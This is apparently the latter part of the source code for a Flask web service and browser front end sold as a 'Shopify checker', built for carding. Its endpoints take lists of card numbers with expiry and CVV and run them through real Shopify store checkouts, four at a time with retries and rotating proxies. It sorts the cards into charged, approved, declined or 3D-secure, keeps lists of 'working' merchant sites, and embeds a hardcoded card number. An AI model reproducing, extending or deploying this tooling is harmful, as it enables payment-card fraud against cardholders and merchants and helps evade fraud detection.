                    url += `&proxy=${encodeURIComponent(proxy.original)}`;
                }
                
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status === 'CHARGED') {
                    currentMassCheck.approved++;
                    addCardToBox('approved', card, data.message);
                } else if (data.status === 'APPROVED') {
                    currentMassCheck.approved++;
                    addCardToBox('approved', card, data.message);
                } else {
                    currentMassCheck.declined++;
                    addCardToBox('declined', card, data.message);
                }
                
                currentMassCheck.results.push({
                    card: card,
                    site: site,
                    proxy: proxy ? proxy.original : 'No proxy',
                    response: data.message,
                    status: data.status
                });
                
            } catch (error) {
                currentMassCheck.declined++;
                addCardToBox('declined', card, error.message);
                currentMassCheck.results.push({
                    card: card,
                    site: site,
                    proxy: proxy ? proxy.original : 'No proxy',
                    response: error.message,
                    status: 'Error'
                });
            }
            
            currentMassCheck.currentIndex++;
            document.getElementById('mass-progress-count').textContent = `${currentMassCheck.currentIndex}/${currentMassCheck.cards.length}`;
            document.getElementById('mass-progress-bar').style.width = `${(currentMassCheck.currentIndex/currentMassCheck.cards.length)*100}%`;
            document.getElementById('mass-approved').textContent = currentMassCheck.approved;
            document.getElementById('mass-declined').textContent = currentMassCheck.declined;
            
            setTimeout(() => processNextCard(site, proxy), 300);
        }
        
        function stopMassCheck() {
            currentMassCheck.running = false;
            document.getElementById('stop-mass-btn').style.display = 'none';
            document.getElementById('mass-status').innerHTML = '<div class="status-message warning">⏸️ Mass check stopped by user</div>';
            document.getElementById('mass-continue-container').style.display = 'block';
        }
        
        function continueMassCheck() {
            if (workingSites.length === 0) {
                alert('You need working sites first!');
                return;
            }
            
            if (proxyRequiredMass && workingProxies.length === 0) {
                alert('Proxy is required! Please add working proxies or disable proxy requirement.');
                return;
            }
            
            document.getElementById('mass-status').innerHTML = '';
            document.getElementById('mass-continue-container').style.display = 'none';
            document.getElementById('stop-mass-btn').style.display = 'inline-block';
            
            currentMassCheck.running = true;
            const site = workingSites[0].domain;
            const proxy = proxyRequiredMass && workingProxies.length > 0 ? workingProxies[0] : null;
            processNextCard(site, proxy);
        }
        
        function clearMassResults() {
            document.getElementById('mass-results').innerHTML = '';
            document.getElementById('mass-cards').value = '';
            document.getElementById('mass-progress').style.display = 'none';
            document.getElementById('mass-continue-container').style.display = 'none';
            document.getElementById('stop-mass-btn').style.display = 'none';
            document.getElementById('mass-status').innerHTML = '';
            document.getElementById('mass-approved').textContent = '0';
            document.getElementById('mass-declined').textContent = '0';
            document.getElementById('mass-threed').textContent = '0';
            currentMassCheck = {
                running: false,
                cards: [],
                currentIndex: 0,
                approved: 0,
                declined: 0,
                threed: 0,
                results: []
            };
        }
        
        function copyBoxContent(type) {
            let content = '';
            let boxName = '';
            
            if (type === 'working') {
                const items = document.querySelectorAll('#working-content .box-item');
                items.forEach(item => {
                    content += item.innerText + '\\n';
                });
                boxName = 'WORKING SITES';
            } else if (type === 'dead') {
                const items = document.querySelectorAll('#dead-content .box-item');
                items.forEach(item => {
                    content += item.innerText + '\\n';
                });
                boxName = 'DEAD SITES';
            } else if (type === 'approved') {
                const items = document.querySelectorAll('#approved-content .box-item');
                items.forEach(item => {
                    content += item.innerText + '\\n';
                });
                boxName = 'APPROVED CARDS';
            } else if (type === 'threed') {
                const items = document.querySelectorAll('#threed-content .box-item');
                items.forEach(item => {
                    content += item.innerText + '\\n';
                });
                boxName = '3D CARDS';
            } else if (type === 'declined') {
                const items = document.querySelectorAll('#declined-content .box-item');
                items.forEach(item => {
                    content += item.innerText + '\\n';
                });
                boxName = 'DECLINED CARDS';
            }
            
            if (content) {
                content = `=== ${boxName} ===\\n\\n` + content;
                copyToClipboard(content);
            } else {
                alert('No items to copy');
            }
        }
        
        // ==================== INITIALIZATION ====================
        window.onload = function() {
            console.log('✅ AFUONA CHECKER loaded');
            setupProxyToggle('proxy-required-mass', 'mass-proxy', 'proxy-warning-mass');
            setupProxyToggle('proxy-required-tester', 'tester-proxy', 'proxy-warning-tester');
            switchTab('proxy');
        };
    </script>
</body>
</html>
"""

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)


@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "type": "shopify",
        "version": "2.0",
        "api_key": API_KEY,
        "features": ["proxy_all_formats", "concurrent_mass_check", "auto_retry", "full_card_display", "polling", "pagination", "phone_number"]
    })

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/check')
def check_card():
    """Check a single card with auto retry"""
    try:
        key = request.args.get('key')
        site = request.args.get('site')
        cc = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        
        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        
        if not site:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        # Validate card format
        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV"}), 400
        
        # Parse site
        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        site_url = f'https://{site}'
        
        # Parse proxy (optional)
        proxy = None
        if proxy_str:
            proxy = parse_proxy_ultimate(proxy_str)
            if not proxy:
                return jsonify({"error": "Invalid proxy format"}), 400
        
        logger.info(f"Checking card on {site_url}")
        
        # Run check with retry
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        checker = ShopifyChecker(proxy=proxy)
        
        async def run_check():
            return await with_retry(checker.process_card, 2, site_url, cc)
        
        result = loop.run_until_complete(run_check())
        loop.close()
        
        # Format response
        status_map = {
            'charged': 'CHARGED',
            'approved': 'APPROVED', 
            'declined': 'DECLINED',
            'error': 'ERROR',
            'unknown': 'UNKNOWN'
        }
        
        return jsonify({
            "success": result['status'] in ['charged', 'approved'],
            "card": cc,
            "status": status_map.get(result['status'], 'UNKNOWN'),
            "message": result['message'],
            "price": result.get('price', 'N/A'),
            "site": site
        })
        
    except Exception as e:
        logger.error(f"Check error: {e}")
        return jsonify({"error": str(e)}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/mass')
def mass_check():
    """Mass check multiple cards with concurrent workers (4x faster)"""
    try:
        key = request.args.get('key')
        site = request.args.get('site')
        proxy_str = request.args.get('proxy')
        cards_param = request.args.get('cards')
        
        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        
        if not site:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        if not cards_param:
            return jsonify({"error": "Missing 'cards' parameter"}), 400
        
        proxy = None
        if proxy_str:
            proxy = parse_proxy_ultimate(proxy_str)
            if not proxy:
                return jsonify({"error": "Invalid proxy format"}), 400
        
        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        site_url = f'https://{site}'
        
        cards = cards_param.split(',')[:100]  # Max 100 cards
        
        logger.info(f"Mass checking {len(cards)} cards on {site_url} with 4 workers")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def process_with_workers():
            semaphore = asyncio.Semaphore(4)  # 4 concurrent workers
            
            async def process_one(card):
                async with semaphore:
                    checker = ShopifyChecker(proxy=proxy)
                    result = await with_retry(checker.process_card, 2, site_url, card.strip())
                    return {
                        "card": card.strip(),
                        "status": result['status'].upper(),
                        "message": result['message'][:100],
                        "price": result.get('price', 'N/A')
                    }
            
            tasks = [process_one(card) for card in cards]
            return await asyncio.gather(*tasks)
        
        results = loop.run_until_complete(process_with_workers())
        loop.close()
        
        # Calculate stats
        charged = len([r for r in results if r['status'] == 'CHARGED'])
        approved = len([r for r in results if r['status'] == 'APPROVED'])
        declined = len([r for r in results if r['status'] == 'DECLINED'])
        errors = len([r for r in results if r['status'] == 'ERROR'])
        
        return jsonify({
            "site": site,
            "total": len(results),
            "charged": charged,
            "approved": approved,
            "declined": declined,
            "errors": errors,
            "results": results
        })
        
    except Exception as e:
        logger.error(f"Mass check error: {e}")
        return jsonify({"error": str(e)}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/test_site')
def test_site_endpoint():
    try:
        key = request.args.get('key')
        site = request.args.get('site')
        proxy_str = request.args.get('proxy')
        
        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        
        if not site:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        
        proxy = None
        if proxy_str:
            proxy = parse_proxy_ultimate(proxy_str)
            if not proxy:
                return jsonify({"error": "Invalid proxy format"}), 400
        
        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        site_url = f'https://{site}'
        
        # Use test card
        test_card = "4031630422575208|01|2030|280"
        
        logger.info(f"Testing site: {site_url}")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        checker = ShopifyChecker(proxy=proxy)
        
        async def run_test():
            return await with_retry(checker.process_card, 2, site_url, test_card)
        
        result = loop.run_until_complete(run_test())
        loop.close()
        
        if result['status'] == 'charged':
            return jsonify({
                "domain": site,
                "working": True,
                "status": "CHARGED",
                "response": result['message']
            })
        elif result['status'] == 'approved':
            return jsonify({
                "domain": site,
                "working": True,
                "status": "APPROVED",
                "response": result['message']
            })
        elif "insufficient" in result['message'].lower():
            return jsonify({
                "domain": site,
                "working": True,
                "status": "NO BALANCE",
                "response": result['message']
            })
        elif "3d" in result['message'].lower() or "secure" in result['message'].lower():
            return jsonify({
                "domain": site,
                "working": True,
                "status": "3D",
                "response": result['message']
            })
        elif "declined" in result['message'].lower():
            return jsonify({
                "domain": site,
                "working": True,
                "status": "DECLINED",
                "response": result['message']
            })
        else:
            return jsonify({
                "domain": site,
                "working": False,
                "status": "DEAD",
                "response": result['message']
            })
        
    except Exception as e:
        logger.error(f"Test site error: {e}")
        return jsonify({"error": str(e)}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/test_proxy')
def test_proxy_endpoint():
    """Test if a proxy is working"""
    try:
        proxy_str = request.args.get('proxy')
        
        if not proxy_str:
            return jsonify({"error": "Missing 'proxy' parameter"}), 400
        
        proxy = parse_proxy_ultimate(proxy_str)
        if not proxy:
            return jsonify({"error": "Invalid proxy format"}), 400
        
        logger.info(f"Testing proxy: {proxy[:50]}...")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def test():
            async with httpx.AsyncClient(proxy=proxy, timeout=15) as client:
                resp = await client.get('https://api.ipify.org?format=json')
                return resp.json().get('ip')
        
        ip = loop.run_until_complete(test())
        loop.close()
        
        return jsonify({
            "success": True,
            "ip": ip,
            "proxy": proxy_str,
            "type": "HTTP/HTTPS" if "http" in proxy else "SOCKS"
        })
        
    except Exception as e:
        logger.error(f"Proxy test failed: {e}")
        return jsonify({"success": False, "error": str(e)}), 400


@app.route('/stats')
def stats():
    """Get API statistics"""
    try:
        key = request.args.get('key')
        
        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        
        return jsonify({
            "api_version": "2.0",
            "features": [
                "proxy_all_formats",
                "concurrent_mass_check", 
                "auto_retry",
                "full_card_display",
                "site_testing",
                "proxy_testing",
                "polling_7_attempts",
                "pagination",
                "phone_number"
            ],
            "supported_proxy_formats": [
                "http://user:pass@host:port",
                "https://host:port",
                "socks5://user:pass@host:port",
                "host:port:user:pass",
                "host:port"
            ],
            "message": "API is ready to use"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/add_sites')
def add_sites():
    try:
        key = request.args.get('key')
        sites_param = request.args.get('sites')
        
        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        
        if not sites_param:
            return jsonify({"error": "Missing 'sites' parameter"}), 400
        
        sites = [s.strip() for s in sites_param.split(',') if s.strip()]
        
        # Save to file
        try:
            config = {}
            if os.path.exists('shopify_config.json'):
                with open('shopify_config.json', 'r') as f:
                    config = json.load(f)
            
            existing_sites = set(config.get('available_sites', []))
            new_sites = [s for s in sites if s not in existing_sites]
            
            config['available_sites'] = list(existing_sites) + new_sites
            config['banned_sites'] = config.get('banned_sites', [])
            config['proxies'] = config.get('proxies', [])
            
            with open('shopify_config.json', 'w') as f:
                json.dump(config, f, indent=2)
            
            return jsonify({
                "success": True,
                "added": len(new_sites),
                "total": len(config['available_sites'])
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 500
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/add_proxies')
def add_proxies():
    try:
        key = request.args.get('key')
        proxies_param = request.args.get('proxies')
        
        if key != API_KEY:
            return jsonify({"error": "Invalid API key"}), 401
        
        if not proxies_param:
            return jsonify({"error": "Missing 'proxies' parameter"}), 400
        
        proxies = [p.strip() for p in proxies_param.split(',') if p.strip()]
        
        # Save to file
        try:
            config = {}
            if os.path.exists('shopify_config.json'):
                with open('shopify_config.json', 'r') as f:
                    config = json.load(f)
            
            existing_proxies = set(config.get('proxies', []))
            new_proxies = [p for p in proxies if p not in existing_proxies]
            
            config['available_sites'] = config.get('available_sites', [])
            config['banned_sites'] = config.get('banned_sites', [])
            config['proxies'] = list(existing_proxies) + new_proxies
            
            with open('shopify_config.json', 'w') as f:
                json.dump(config, f, indent=2)
            
            return jsonify({
                "success": True,
                "added": len(new_proxies),
                "total": len(config['proxies'])
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 500
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found. See / for available endpoints"}), 404

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal server error"}), 500

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
if __name__ == '__main__':
    print("=" * 60)
    print(" SHOPIFY CHECKER API - COMPLETE V2")
    print("=" * 60)
    print(f" Running on port: {PORT}")
    print(f" API Key: {API_KEY}")
    print(f" Version: 2.0 (Complete)")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=PORT, debug=False)